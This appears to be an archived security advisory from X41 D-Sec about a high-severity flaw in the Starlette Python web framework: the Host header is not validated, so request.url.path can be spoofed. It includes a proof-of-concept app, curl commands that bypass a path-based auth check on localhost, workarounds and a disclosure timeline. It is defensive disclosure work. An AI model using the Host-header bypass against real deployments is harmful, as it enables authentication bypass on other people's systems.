@@ -1,0 +1,430 @@
+<!-- Archived evidence source
+source_url: https://www.x41-dsec.de/lab/advisories/x41-2026-002-starlette
+fetched_at: 2026-06-24T20:47:19Z
+curl_returncode: 0
+-->
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <!-- As a source use a 512x512 png image, and then upload it to https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/images/favicons/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicons/favicon-16x16.png">
+<link rel="manifest" href="/assets/images/favicons/site.webmanifest">
+<link rel="mask-icon" href="/assets/images/favicons/safari-pinned-tab.svg" color="#5bbad5">
+<link rel="shortcut icon" href="/assets/images/favicons/favicon.ico">
+<meta name="apple-mobile-web-app-title" content="X41 D-Sec">
+<meta name="application-name" content="X41 D-Sec">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-config" content="/assets/images/favicons/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+  <!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Advisory X41-2026-002: Request Host Header not Validated in Starlette | X41 D-Sec - Penetration Tests and Source Code Audits</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Advisory X41-2026-002: Request Host Header not Validated in Starlette" />
+<meta name="author" content="JJ, Yassine El Baaj, Markus Vervier" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Missing Host header validation leads to misleading URL path in Starlette" />
+<meta property="og:description" content="Missing Host header validation leads to misleading URL path in Starlette" />
+<link rel="canonical" href="http://0.0.0.0:4000/lab/advisories/x41-2026-002-starlette/" />
+<meta property="og:url" content="http://0.0.0.0:4000/lab/advisories/x41-2026-002-starlette/" />
+<meta property="og:site_name" content="X41 D-Sec - Penetration Tests and Source Code Audits" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-05-22T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Advisory X41-2026-002: Request Host Header not Validated in Starlette" />
+<script type="application/ld+json">
+{"datePublished":"2026-05-22T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/lab/advisories/x41-2026-002-starlette/"},"dateModified":"2026-05-22T00:00:00+00:00","author":{"@type":"Person","name":"JJ, Yassine El Baaj, Markus Vervier"},"@type":"BlogPosting","url":"http://0.0.0.0:4000/lab/advisories/x41-2026-002-starlette/","description":"Missing Host header validation leads to misleading URL path in Starlette","headline":"Advisory X41-2026-002: Request Host Header not Validated in Starlette","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+        <meta name="image" content="http://0.0.0.0:4000/opengraph/5916169a0b133449f931b12a1d3f90d36ba21db5.jpg">
+        <meta name="twitter:image" content="http://0.0.0.0:4000/opengraph/5916169a0b133449f931b12a1d3f90d36ba21db5.jpg">
+        <meta name="twitter:image:alt" content="Advisory X41-2026-002: Request Host Header not Validated in Starlette">
+        <meta property="og:image" content="http://0.0.0.0:4000/opengraph/5916169a0b133449f931b12a1d3f90d36ba21db5.jpg">  
+        <meta property="og:image:alt" content="Advisory X41-2026-002: Request Host Header not Validated in Starlette">
+        <meta name="twitter:card" content="summary_large_image">
+      
+  <link rel="stylesheet" href="/assets/css/styles.css">
+  <link href='https://x41-dsec.de/feed.xml' rel='alternate' title='X41 Security News Feed' type='application/atom+xml'>
+</head>
+
+<body class="post-page">
+  
+
+<nav id="navbar">
+  <div class="Navigation-main">
+    <a class="Navigation-home" href="/">
+      <img alt="X41 D-Sec logotype" src="/assets/images/svg/logo.svg">
+    </a>
+    <div class="Navigation-menu">
+      <img alt="X41 D-Sec logotype" src="/assets/images/svg/hamburger.svg">
+    </div>
+    <ul class="Navigation-items">
+      
+        <li>
+          <a  href="/company/">
+            Company
+          </a>
+          
+          
+            <ul class="Navigation-subitems">
+              
+                <li>
+                  <a href="/company/#company" >
+                    Mission
+                  </a>
+                </li>
+              
+                <li>
+                  <a href="/company/#locations" >
+                    Locations
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+        <li>
+          <a  href="/news/">
+            News
+          </a>
+          
+          
+            <ul class="Navigation-subitems">
+              
+                <li>
+                  <a href="/news/" >
+                    ResearchBlog
+                  </a>
+                </li>
+              
+                <li>
+                  <a href="/news/lab/" >
+                    Lab
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+        <li>
+          <a  href="/services/">
+            Services
+          </a>
+          
+          
+            <ul class="Navigation-subitems">
+              
+                <li>
+                  <a href="/services/code-audit/" >
+                    AppSec / Code Audits
+                  </a>
+                </li>
+              
+                <li>
+                  <a href="/services/red-teaming/" >
+                    Red Teaming
+                  </a>
+                </li>
+              
+                <li>
+                  <a href="/services/security-research/" >
+                    Security Research
+                  </a>
+                </li>
+              
+                <li>
+                  <a href="/services/penetration-testing/" >
+                    Penetration Testing
+                  </a>
+                </li>
+              
+                <li>
+                  <a href="/services/fuzzing/" >
+                    Fuzzing
+                  </a>
+                </li>
+              
+                <li>
+                  <a href="/services/purple/" >
+                    Purple Teaming
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+        <li>
+          <a  href="/references/">
+            References
+          </a>
+          
+          
+        </li>
+      
+        <li>
+          <a  href="/contact/">
+            Contact
+          </a>
+          
+          
+        </li>
+      
+        <li>
+          <a  href="/jobs/">
+            Jobs
+          </a>
+          
+          
+        </li>
+      
+        <li>
+          <a  href="/faq/">
+            FAQ
+          </a>
+          
+          
+        </li>
+      
+    </ul>
+  </div>
+  
+
+
+
+
+
+</nav>
+
+  <main>
+    <div class="post">
+  <h1>NEWS</h1>
+  
+  <div class="post-content">
+    <p>X41 D-Sec GmbH Security Advisory: X41-2026-002</p>
+
+<h1 id="request-host-header-not-validated-in-starlette">Request Host Header not Validated in Starlette</h1>
+
+<p><strong>Severity Rating:</strong> High</p>
+
+<p><strong>Confirmed Affected Versions:</strong> starlette &gt;= 0.8.3, &lt; 1.0.1</p>
+
+<p><strong>Confirmed Patched Versions:</strong> starlette 1.0.1</p>
+
+<p><strong>Vendor:</strong> Starlette</p>
+
+<p><strong>Vendor URL:</strong> <a href="https://github.com/Kludex/starlette">https://github.com/Kludex/starlette</a></p>
+
+<p><strong>Vector:</strong> Request Host Header not Validated</p>
+
+<p><strong>Credit:</strong> X41 D-Sec GmbH, JJ</p>
+
+<p><strong>Status:</strong> Public</p>
+
+<p><strong>CVE:</strong> To be assigned</p>
+
+<p><strong>GitHub ID:</strong> <a href="https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr">GHSA-86qp-5c8j-p5mr</a></p>
+
+<p><strong>CWE</strong> 436</p>
+
+<p><strong>CVSS Score:</strong> 7</p>
+
+<p><strong>CVSS Vector:</strong> CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N</p>
+
+<p><strong>Advisory URL:</strong> <a href="https://www.x41-dsec.de/lab/advisories/x41-2026-002-starlette/">https://www.x41-dsec.de/lab/advisories/x41-2026-002-starlette/</a></p>
+
+<h1 id="summary-and-impact">Summary and Impact</h1>
+<p>Starlette reconstructs the requested URL based on the HTTP <code class="language-plaintext highlighter-rouge">Host</code> request header and requested path, but does not perform any validation of the <code class="language-plaintext highlighter-rouge">Host</code> header value. This allows attackers to inject paths into the host part, prepending the actual path. However, routing in Starlette is based on the actual request path. This inconsistent interpretation of HTTP requests may lead to issues such as authentication bypass when the authentication depends on the reconstructed URL’s path. Starlette is the foundation of the FastAPI Python framework.</p>
+
+<h1 id="product-description">Product Description</h1>
+<p>Starlette is a lightweight, high-performance ASGI (Asynchronous Server Gateway Interface) framework and toolkit used for building asynchronous web services in Python. It is known for its speed, simplicity, and for being the foundation of popular frameworks like FastAPI.</p>
+
+<h1 id="analysis">Analysis</h1>
+<p>When issuing an HTTP request for <code class="language-plaintext highlighter-rouge">https://example.com/foo</code>, clients extract the hostname <code class="language-plaintext highlighter-rouge">example.com</code> and the path <code class="language-plaintext highlighter-rouge">/foo</code> and issue the following request:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/foo</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">example.com</span>
+</code></pre></div></div>
+
+<p>Starlette reconstructs the client’s original URL based on <code class="language-plaintext highlighter-rouge">f"{scheme}://{host_header}{path}"</code>, where <code class="language-plaintext highlighter-rouge">{host_header}</code> is the value of the <code class="language-plaintext highlighter-rouge">Host</code> request header and <code class="language-plaintext highlighter-rouge">{path}</code> is what was submitted in the first request line.</p>
+
+<p>Starlette did not reject invalid characters in the Host header as per <a href="https://www.rfc-editor.org/rfc/rfc9112.html#section-3.2-6">RFC 9112 Section 3.2</a>, and a request such as:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/foo</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">example.com/abc?bar=</span>
+</code></pre></div></div>
+
+<p>would result in the URL <code class="language-plaintext highlighter-rouge">http://example.com/abc?bar=/foo</code>, which has a path of <code class="language-plaintext highlighter-rouge">/abc</code> while <code class="language-plaintext highlighter-rouge">/foo</code> was requested.</p>
+
+<p>The routing algorithm of Starlette depends on the HTTP path, but the <code class="language-plaintext highlighter-rouge">request.url.path</code> attribute which is made available to middlewares and endpoints is based on the reconstructed URL. It is unexpected for users that <code class="language-plaintext highlighter-rouge">request.url.path</code> is different from the actual path requested over HTTP.</p>
+
+<p>Using automated triage and analysis, X41 D-Sec has found several instances of middleware implementations in popular open source projects that rely on the <code class="language-plaintext highlighter-rouge">request.url</code> to apply security restrictions to certain paths.
+These could be bypassed using a malformed host request header, similar to the PoC attached below, resulting in various security issues ranging from authentication bypass to SSRF and other issues that in some cases even lead to remote-code-execution on the affected system.</p>
+
+<h1 id="proof-of-concept">Proof of Concept</h1>
+<pre><code class="language-cmd">pip install starlette
+</code></pre>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">starlette.applications</span> <span class="kn">import</span> <span class="n">Starlette</span>
+<span class="kn">from</span> <span class="nn">starlette.middleware</span> <span class="kn">import</span> <span class="n">Middleware</span>
+<span class="kn">from</span> <span class="nn">starlette.middleware.base</span> <span class="kn">import</span> <span class="n">BaseHTTPMiddleware</span>
+<span class="kn">from</span> <span class="nn">starlette.responses</span> <span class="kn">import</span> <span class="n">PlainTextResponse</span>
+<span class="kn">from</span> <span class="nn">starlette.routing</span> <span class="kn">import</span> <span class="n">Route</span>
+
+<span class="k">class</span> <span class="nc">AuthMiddleware</span><span class="p">(</span><span class="n">BaseHTTPMiddleware</span><span class="p">):</span>
+    <span class="k">async</span> <span class="k">def</span> <span class="nf">dispatch</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">call_next</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">path</span> <span class="o">==</span> <span class="s">""</span> <span class="ow">or</span> <span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">path</span> <span class="o">==</span> <span class="s">"/"</span><span class="p">:</span>
+            <span class="k">return</span> <span class="k">await</span> <span class="n">call_next</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">PlainTextResponse</span><span class="p">(</span><span class="s">"Forbidden</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">status_code</span><span class="o">=</span><span class="mi">403</span><span class="p">)</span>
+
+<span class="k">async</span> <span class="k">def</span> <span class="nf">root</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">PlainTextResponse</span><span class="p">(</span><span class="s">"Hello World</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="k">async</span> <span class="k">def</span> <span class="nf">admin</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">PlainTextResponse</span><span class="p">(</span><span class="s">"secret=123</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">routes</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="n">Route</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">endpoint</span><span class="o">=</span><span class="n">root</span><span class="p">),</span>
+    <span class="n">Route</span><span class="p">(</span><span class="s">"/admin"</span><span class="p">,</span> <span class="n">endpoint</span><span class="o">=</span><span class="n">admin</span><span class="p">),</span>
+<span class="p">]</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Starlette</span><span class="p">(</span><span class="n">routes</span><span class="o">=</span><span class="n">routes</span><span class="p">,</span> <span class="n">middleware</span><span class="o">=</span><span class="p">[</span><span class="n">Middleware</span><span class="p">(</span><span class="n">AuthMiddleware</span><span class="p">)])</span>
+</code></pre></div></div>
+
+<p>Then, start the app using any of the ASGI servers:</p>
+<pre><code class="language-cmd">pip install {daphne,hypercorn,uvicorn,granian}
+daphne poc:app
+hypercorn poc:app
+uvicorn poc:app
+granian --interface asgi poc:app
+</code></pre>
+
+<p>Confirm that the <code class="language-plaintext highlighter-rouge">Host</code> header is not validated:</p>
+<pre><code class="language-cmd">curl -i -H 'Host: foo' localhost:8000/admin # 403 Forbidden
+curl -i -H 'Host: foo?' localhost:8000/admin # 200 OK
+</code></pre>
+
+<h1 id="workarounds">Workarounds</h1>
+
+<ul>
+  <li>Avoid relying on the request path and instead implement features such as authentication based on the requested endpoint.</li>
+  <li>Use <code class="language-plaintext highlighter-rouge">request.scope["path"]</code> instead of <code class="language-plaintext highlighter-rouge">request.url.path</code>.</li>
+  <li>Deploy a reverse proxy that rejects invalid Host headers, such as nginx or Apache HTTP Server, in front of the Python application.</li>
+  <li>Use an ASGI server that validates the host header according to the RFC spec.</li>
+</ul>
+
+<h1 id="timeline">Timeline</h1>
+
+<p><strong>2026-01-27</strong> Issue identified during unrelated source code audit</p>
+
+<p><strong>2026-02-04</strong> PoC created and vendor contacted. <a href="https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr">GHSA-86qp-5c8j-p5mr</a></p>
+
+<p><strong>2026-02-05</strong> Vendor replied</p>
+
+<p><strong>2026-03-01</strong> Patch proposed by the vendor</p>
+
+<p><strong>2026-05-21</strong> Patch publicly released by the vendor</p>
+
+<p><strong>2026-05-22</strong> Advisory released</p>
+
+  </div>
+  <div class="post-author">
+    Author:
+    <a  href="mailto:info@x41-dsec.de" >JJ, Yassine El Baaj, Markus Vervier</a>
+  </div>
+
+  <div class="post-date">
+    Date: May 22, 2026
+  </div>
+
+</div>
+<div class="post-related-outer">
+  <div class="post-related">
+    
+      <div>
+        <div>&laquo;</div>
+        <a class="prev" href="/security/research/job/news/2026/04/21/securedrop-review-2026/">
+          X41 Reviewed SecureDrop</a>
+      </div>
+    
+    
+  </div>
+</div>
+
+  </main>
+  <footer>
+  <div class="Footer-address">
+    <div class="Footer-address-name">CONTACT</div>
+    <div class="Address">
+  <div>X41 D-Sec GmbH
+Soerser Weg 20
+52070 Aachen
+</div>
+  <div>
+    <a href="tel:4924198094180">
+      +49 (0) 241 9809418-0
+    </a>
+    <a href="tel:4924198094189">
+      +49 (0) 241 9809418-9
+    </a>
+    <a href="mailto:info@x41-dsec.de">
+      info@x41-dsec.de
+    </a>
+  </div>
+</div>
+
+    
+
+<a href="/static/pgp/0x6746CF4698A7AB6Epub.asc.txt" target="_blank" rel="noopener">PGP Key</a>
+  </div>
+  <div class="Footer-social">
+    <div>
+      <div class="Footer-social-name">Connect</div>
+      <div class="Footer-social-items">
+        
+  <a href="https://github.com/x41sec" target="_blank" rel="noopener" title="X41 Github">
+    <div>Github</div>
+    <img src="/assets/images/svg/github.svg" alt="X41 Github">
+  </a>
+
+  <a href="https://infosec.exchange/@x41sec" target="_blank" rel="noopener" title="X41 Mastodon">
+    <div>Mastodon</div>
+    <img src="/assets/images/svg/mastodon.svg" alt="X41 Mastodon">
+  </a>
+
+  <a href="https://twitter.com/X41Sec" target="_blank" rel="noopener" title="X41 Twitter">
+    <div>Twitter</div>
+    <img src="/assets/images/svg/twitter.svg" alt="X41 Twitter">
+  </a>
+
+  <a href="https://de.linkedin.com/company/x41" target="_blank" rel="noopener" title="X41 LinkedIn">
+    <div>LinkedIn</div>
+    <img src="/assets/images/svg/linkedin.svg" alt="X41 LinkedIn">
+  </a>
+
+      </div>
+    </div>
+  </div>
+  <div class="Footer-links">
+    
+      <a href="/faq/">FAQ</a>
+    
+      <a href="/references/">Partners</a>
+    
+      <a href="/terms/">Terms of Use</a>
+    
+      <a href="/privacy/">Privacy</a>
+    
+      <a href="/imprint/">Imprint</a>
+    
+  </div>
+</footer>
+  <script src="/assets/js/main.js"></script>
+</body>
+
+</html>
